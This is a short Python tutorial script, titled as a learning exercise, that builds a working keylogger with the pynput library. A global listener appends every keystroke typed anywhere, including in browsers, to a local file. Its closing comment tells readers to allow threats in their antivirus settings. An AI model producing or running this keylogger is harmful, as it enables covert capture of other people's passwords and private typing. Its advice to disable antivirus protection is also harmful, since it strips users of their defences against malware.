#Let's create a keylogger together (Learning purpose)

#Make sure to install pynput first (pip install pynput)
#Let's first import pynput which include keyboard module which can be used to capture key events from user)


from pynput import keyboard 

#We are going to firrst create the function keyPressed which is going to take every key and append it to the keyfile.txt
def keyPressed(key):
    print(str(key))
    with open("keyfile.txt", "a") as logkey:
        try:
            char= key.char
            logkey.write(char)
        except:
            print("Error getting char")


# Here it says that any time the key is pressed go pass that information to the keyPressed function.  
if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()


# The codes are good to go, After running your program if you type on your keyboard somewhere (Either in the terminal, in a text file or in a browser) the keyfile.txt will be automatically be created recording every key you type on your keyboard.
#But first of all make sure to allow threats (Found in settings in Virus and Threats protection)
